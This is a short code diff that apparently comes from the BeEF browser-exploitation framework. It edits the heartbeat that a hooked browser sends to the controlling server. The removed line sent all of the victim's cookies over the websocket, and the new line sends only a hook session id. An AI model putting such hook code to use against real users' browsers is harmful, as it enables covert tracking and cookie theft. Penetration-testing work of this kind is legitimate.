@@ -60,13 +60,14 @@ beef.websocket = {
         console.log("Sent [" + data + "]");
     },
 
+    //todo antisnatchor: we need to get only the BEEFHOOK cookie value, not every cookie.
+    //todo in this way it will be easier to parse it server side.
     alive: function (){
-        beef.websocket.send('{"alive":"'+document.cookie+'"}');
+        beef.websocket.send('{"alive":"'+beef.session.get_hook_session_id()+'"}');
         console.log("sent alive");
         setTimeout("beef.websocket.alive()", beef.websocket.alive_timer);
 
     }
-
 };
 
 beef.regCmp('beef.websocket');
